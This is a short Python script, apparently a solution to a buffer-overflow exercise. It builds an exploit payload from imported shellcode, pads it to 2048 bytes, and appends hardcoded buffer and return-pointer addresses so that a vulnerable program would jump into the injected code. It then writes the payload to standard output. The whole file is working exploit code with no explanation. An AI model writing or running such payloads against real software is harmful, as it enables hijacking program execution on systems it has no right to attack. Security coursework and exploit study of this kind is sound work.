#!/usr/bin/env python3

from shellcode import shellcode
import sys

padding = 2048 - len(shellcode)

buffer = shellcode + b"X" * padding

buffer_address = 0x7ffffff09ba0
return_address = 0x7ffffff0a3b8

a_value = buffer_address.to_bytes(8, "little")
p_value = return_address.to_bytes(8, "little")

combined = buffer + a_value + p_value

sys.stdout.buffer.write(combined)